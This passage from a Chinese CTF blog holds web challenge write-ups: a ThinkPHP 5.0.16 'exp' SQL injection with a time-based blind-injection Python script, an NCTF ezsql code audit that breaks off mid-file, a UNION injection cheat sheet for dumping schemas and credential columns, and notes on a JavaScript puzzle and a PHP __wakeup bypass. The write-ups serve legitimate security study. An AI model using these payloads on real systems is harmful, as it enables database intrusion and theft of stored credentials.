punctuation">{</span>            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'+'</span> <span class="token punctuation">.</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">'dec'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span> <span class="token punctuation">.</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>发现当我们传入的第一位的值为exp时，该函数会直接把第二位的值传给result当中，于是我们可以传参***/?username[0]=exp&amp;username[1]=payload***，于是可进行sql注入。</p><h3 id="ThinkPHP驼峰命名法"><a href="#ThinkPHP驼峰命名法" class="headerlink" title="ThinkPHP驼峰命名法"></a>ThinkPHP驼峰命名法</h3><p>默认情况下，URL地址中的控制器和操作名是不区分大小写的，因此下面的访问其实是等效的:</p><pre class=" language-1"><code class="language-1">http://tp5.com/index.php/index/Index/Indexhttp://tp5.com/index.php/index/INDEX/INDEX</code></pre><h2 id="做题详解"><a href="#做题详解" class="headerlink" title="做题详解"></a>做题详解</h2><p>扫目录下源码得到<a href="http://www.zip/">www.zip</a><br>随便输入后发现网站是用ThinkPHPv5.0.16搭建的，发现我们可以路由访问规则来进行访问。<br>分析源码，找出上述漏洞后，我们可以使用基于时间的布尔盲注来解题，脚本如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">SQL_injection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>        res<span class="token operator">=</span><span class="token string">''</span>        left<span class="token operator">=</span><span class="token number">32</span>        right<span class="token operator">=</span><span class="token number">128</span>        mid<span class="token operator">=</span><span class="token punctuation">(</span>left<span class="token operator">+</span>right<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>            begin_time<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            payload_database<span class="token operator">=</span><span class="token string">"if(ascii(substr(database(), %d, 1))>%d, sleep(4), sleep(1))"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>            payload_all_database<span class="token operator">=</span><span class="token string">"if(ascii(substr(select(group_concat(schema_name))from(information_schema.schemata)), %d, 1))>%d, sleep(4), sleep(1))"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>            payload_table<span class="token operator">=</span><span class="token string">"if(ascii(substr(select(group_concat(table_name)from(information_schema.tables)where(table_schema='nctf')), %d, 1))>%d), sleep(4), sleep(1))"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>            payload_column<span class="token operator">=</span><span class="token string">"if(ascii(substr(select(group_concat(column_name)from(information_schema.columns)where(table_name='m1saka')), %d, 1)>%d), sleep(4), sleep(1))"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>            payload_info<span class="token operator">=</span><span class="token string">"if(ascii(substr(select(load_file("</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>ffllaagg<span class="token punctuation">.</span>php<span class="token string">")), %d, 1)>%d), sleep(4), sleep(1))"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>            payload<span class="token operator">=</span>payload_info            url<span class="token operator">=</span><span class="token string">'http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=payload'</span>            r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>            end_time<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            lost_time<span class="token operator">=</span>end_time<span class="token operator">-</span>begin_time            <span class="token keyword">if</span> lost_time <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">:</span>                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right<span class="token operator">=</span>mid        <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        res<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span> <span class="token punctuation">:</span>    SQL_injection<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-SQL ctf-tp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021NCTF-web ezsql复现</title>
      <link href="/2021/12/09/2021NCTF-web%20ezsql%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/12/09/2021NCTF-web%20ezsql%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2021NCTF-web-ezsql复现"><a href="#2021NCTF-web-ezsql复现" class="headerlink" title="2021NCTF-web ezsql复现"></a>2021NCTF-web ezsql复现</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>下载下来附件解压后是三个php代码，进行代码审计：<br>login.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#调用一次config.php</span><span class="token delimiter">?></span><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>There is no absolutely safe system<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token shell-comment comment">#检测变量是否为空</span>    <span class="token variable">$query</span> <span class="token operator">=</span> db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM `users` where password=md5(%s)"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#password的值作为prepare的参数传入</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$query</span> <span class="token operator">=</span> db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token punctuation">.</span> <span class="token string">" and name=%s"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$query</span> <span class="token punctuation">.</span> <span class="token string">" and name='benjaminEngel'"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$query</span> <span class="token punctuation">.</span> <span class="token string">" limit 1"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'NCTF{ez'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Wrong name or password.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token delimiter">?></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>benjaminEngel<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>bejaminEngel</span> <span class="token attr-name">disabled</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Enter password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Submit<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span><span class="token delimiter">?></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>config.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token string">"db"</span><span class="token punctuation">;</span><span class="token variable">$db_user</span> <span class="token operator">=</span> <span class="token string">"mysql"</span><span class="token punctuation">;</span><span class="token variable">$db_pass</span> <span class="token operator">=</span> <span class="token string">"mysql123"</span><span class="token punctuation">;</span><span class="token variable">$db_database</span> <span class="token operator">=</span> <span class="token string">"2021"</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'DB.php'</span><span class="token punctuation">;</span><span class="token constant">DB</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">buildMySQL</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">,</span> <span class="token variable">$db_user</span><span class="token punctuation">,</span> <span class="token variable">$db_pass</span><span class="token punctuation">,</span> <span class="token variable">$db_database</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Error whiling connecting to DB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>DB.php</p><p>````php<br>&lt;?php<br>class DB{<br>    private static $db = null;<br>    public function __construct($db_host, $db_user, $db_pass, $db_database){<br>        static::$db = new mysqli($db_host, $db_user, $db_pass, $db_database);<br>    }<br>    static public function buildMySQL($db_host, $db_user, $db_pass, $db_database)<br>    {<br>        return new DB($db_host, $db_user, $db_pass, $db_database);<br>    }<br>    public static function getInstance(){<br>        return static::$db;<br>    }<br>    public static function connect_error(){<br>        return static::$db-&gt;connect_errno;<br>    }<br>    public static function prepare($query, $args){<br>        if (is_null($query)){<br>            return;<br>        }<br>        if (strpos($query, ‘%’) === false)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web高手进阶区Newscenter|NaNNaNNaNNaN-Batman|unserialize3题解</title>
      <link href="/2021/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BANewscenter(SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2)NaNNaNNaNNaN-Batmanunserialize3%E9%A2%98%E8%A7%A3/"/>
      <url>/2021/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BANewscenter(SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2)NaNNaNNaNNaN-Batmanunserialize3%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界web高手进阶区Newscenter-NaNNaNNaNNaN-Batman-unserialize3题解"><a href="#攻防世界web高手进阶区Newscenter-NaNNaNNaNNaN-Batman-unserialize3题解" class="headerlink" title="攻防世界web高手进阶区Newscenter|NaNNaNNaNNaN-Batman|unserialize3题解"></a>攻防世界web高手进阶区Newscenter|NaNNaNNaNNaN-Batman|unserialize3题解</h1><h2 id="Newscenter"><a href="#Newscenter" class="headerlink" title="Newscenter"></a>Newscenter</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="MySQL中information-scheme库"><a href="#MySQL中information-scheme库" class="headerlink" title="MySQL中information_scheme库"></a>MySQL中information_scheme库</h4><p>SCHEMATA：SCHEMA_NAME<br>TABLES：TABLE_SCHEMA， TABLE_NAME<br>COLUMNS：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME</p><h4 id="MySQL中UNION规则"><a href="#MySQL中UNION规则" class="headerlink" title="MySQL中UNION规则"></a>MySQL中UNION规则</h4><p>1.UNION必须由两条或两条以上的SELECT语句组成，语句之间用关键字UNION分隔。<br>2.UNION中的每个查询必须包含相同的列。<br>3.UNION会从查询结果集中自动去除了重复行。<br>4.利用前提：页面上有显示位。</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>1.判断列数:</p><pre class=" language-SQL"><code class="language-SQL">order by n#列数小于n时回显正常</code></pre><p>2.判断显示位(后文皆以列数为3为例)</p><pre class=" language-SQL"><code class="language-SQL">union select 1,2,3</code></pre><p>3.获取当数据库名称和当前连接数据库的用户</p><pre class=" language-SQL"><code class="language-SQL">union select 1,2,database()union select 1,2,user()</code></pre><p>4.列出所有数据库</p><pre class=" language-SQL"><code class="language-SQL">#limit 一个一个打印出来库名union select 1,2,schema_name from information_schema.schemata limit 0,1#group_concat 一次性全部显示union select 1,2,group_concat(schema_name) from information_schema.schemata</code></pre><p>5.列出(数据库：test)中所有的表</p><pre class=" language-SQL"><code class="language-SQL">#limit 一个一个打印出来字段名union select 1,2,table_name from information_schema.tables where table_schema=‘test’ limit 0,1#group_concat 一次性全部显示union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x674657374#注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。（在20211126~20211127的NCTF上也有一道需要绕过单引号的题）</code></pre><p>6.列出（数据库：test;表：admin ）中所有的字段</p><pre class=" language-SQL"><code class="language-SQL">#limit 一个一个打印出来union select 1,2,column_name from information_schema.columns wheretable_schema=‘test’ and table_name=‘admin’ limit 0,1#group_concat 一次性全部显示union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=0x74657374 and table_name=0x61646d696e</code></pre><p>7.列出（数据库：test;表：admin;字段:username,passwd）中的数据</p><pre class=" language-SQL"><code class="language-SQL">#limit 一个一个打印出来union select 1,2,(select username,passwd from test.admin limit 0,1)#group_concat 一次性全部显示union select 1,2,(select group_concat(concat(username,0x20,passwd))) from test.admin#0x20对应的为' '方便区分两数据</code></pre><h3 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h3><p>进入题目后发现是SQL中的UNION联合查询。首先构造payload来判断列数：</p><pre class=" language-SQL"><code class="language-SQL">1' order by n #</code></pre><p>直到n=4时回显错误，故列长为3。<br>构造payload判断显示位：</p><pre class=" language-SQL"><code class="language-SQL">union select 1,2,3</code></pre><p>列出所有数据库：</p><pre class=" language-SQL"><code class="language-SQL">1' union select 1,2,group_concat(schema_name) from information_schema.schemata #</code></pre><p>回显为information_schema和news。<br>列出(数据库：news)中所有的表：</p><pre class=" language-SQL"><code class="language-SQL">1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='news' #</code></pre><p>回显为news和secret_table。<br>列出（数据库：news;表：secret_table ）中所有的字段：</p><pre class=" language-SQL"><code class="language-SQL">1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='news' and table_name='secret_table' #</code></pre><p>回显为id和fl4g，显然flag在fl4g中。<br>列出（数据库：news;表：secret_table;字段:fl4g）中的数据</p><pre class=" language-SQL"><code class="language-SQL">union select 1,2,(select group_concat(concat(fl4g))) from news.secret_table #</code></pre><p>得到flag。</p><h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p><em><strong>eval()</strong></em> 函数用来执行一个字符串表达式，并返回表达式的值。<br>***alert()***函数可创造一个弹窗，并显示表达式。</p><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>下载附件，解压，得到一个名称为web100无后缀的文件，建议是不急着加后缀名啥的，直接用记事本直接打开，可得代码如下：<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232520897-1980531531.png"><br>看不出来代码的用途，但从script可看出和script有关。尝试在浏览器中打开，发现只有一个输入框。<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232546093-962913534.png"><br>在记事本中将eval(<em>)改为alert(</em>)重新在浏览器中打开得到：<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232609919-1698904556.png"><br>整理得：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> e<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>length<span class="token operator">==</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/^be0f23/</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/233ac/</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/e98aa$/</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/c7be9/</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">var</span> t<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"fl"</span><span class="token punctuation">,</span><span class="token string">"s_a"</span><span class="token punctuation">,</span><span class="token string">"i"</span><span class="token punctuation">,</span><span class="token string">"e}"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">var</span> n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"_h0l"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">var</span> r<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"g{"</span><span class="token punctuation">,</span><span class="token string">"e"</span><span class="token punctuation">,</span><span class="token string">"_0"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">var</span> i<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"it'"</span><span class="token punctuation">,</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">var</span> s<span class="token operator">=</span><span class="token punctuation">[</span>t<span class="token punctuation">,</span>n<span class="token punctuation">,</span>r<span class="token punctuation">,</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> o<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>o<span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">;</span><span class="token operator">++</span>o<span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>o<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        s<span class="token punctuation">[</span>o<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">}</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;input id="c">&lt;button onclick=$()>Ok&lt;/button>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">delete</span> _</code></pre><p>发现其中五个判断：<br>1.一共有16个字符<br>2.开头必须是be0f23<br>3.必须含有233ac和c7be9<br>4.必须以e98aa结束<br>可构造payload：be0f233ac7be98aa<br>最后再将代码的alert(<em>)改回eval(</em>)，在提交框中输入payload即可得到flag。<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232638652-1161924991.png"></p><h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><h3 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h4><p>php魔术方法下列方法名被认为是魔术方法： <em><strong>__construct() 、 __destruct() 、 __call() 、 __callStatic() 、 __get() 、 __set() 、 __isset() 、 __unset() 、 __sleep() 、 __wakeup() 、 __serialize() 、 __unserialize() 、 __toString() 、 __invoke() 、 __set_state() 、 __clone() 、 __debugInfo()</strong></em> 。<br><strong>注意</strong>：<br>1.除了 <em><strong>__construct()<em><strong>，</strong></em>__destruct()</strong></em> ，和 <em><strong>__clone()</strong></em> 之外的所有魔术方法都必须声明为 public，否则会发出 E_WARNING。 在 PHP 8.0.0 之前没有为魔术方法 <em><strong>__sleep()<em><strong>、 <em><strong>__wakeup()</strong></em> 、</strong></em>__serialize()</strong></em> 、<em><strong>__unserialize()</strong></em> 、<em><strong>__set_state()</strong></em> 发出诊断信息。<br>2.如果定义魔术方法时使用类型声明，它们必须与本文档中描述的签名相同，否则会发出致命错误。 在 PHP 8.0.0 之前，不会发出诊断信息。 然而，<em><strong>__construct()</strong></em> 和<em><strong>__destruct()</strong></em> 不能声明返回类型， 否则会发出致命错误。</p><h5 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep()和__wakeup()"></a>__sleep()和__wakeup()</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token keyword">public</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>void</code></pre><p>***serialize()<em><strong>函数会检查是否存在</strong></em>__sleep()<em><strong>函数，如果存在，该方法会被优先调用。<br>与之相反，</strong></em>unserialize()<em><strong>会检查是否存在一个</strong></em>__wakeup()<em><strong>方法。如果存在，则会先调用</strong></em>__wakeup()***方法，预先准备对象需要的资源。<br>具体的魔术方法可参考：<a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><h4 id="wakeup-函数的漏洞"><a href="#wakeup-函数的漏洞" class="headerlink" title="__wakeup()函数的漏洞"></a>__wakeup()函数的漏洞</h4><p>***__wakeup()***漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。譬如：O:7:”Student”:3:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。</p><h3 